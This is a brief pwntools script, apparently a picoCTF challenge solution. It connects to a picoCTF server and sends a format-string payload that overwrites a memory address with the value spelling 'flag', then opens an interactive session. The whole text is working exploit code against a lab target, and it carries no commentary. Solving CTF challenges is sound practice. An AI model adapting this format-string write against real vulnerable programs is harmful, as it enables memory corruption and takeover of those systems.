from pwn import *

context.arch = 'amd64'
r = remote("rhea.picoctf.net" , 57106)


sus_addr = 0x404060

offset = 14

target_value = 0x67616c66

payload = fmtstr_payload(offset , {sus_addr : target_value})

r.recvline()
r.sendline(payload)

r.interactive()
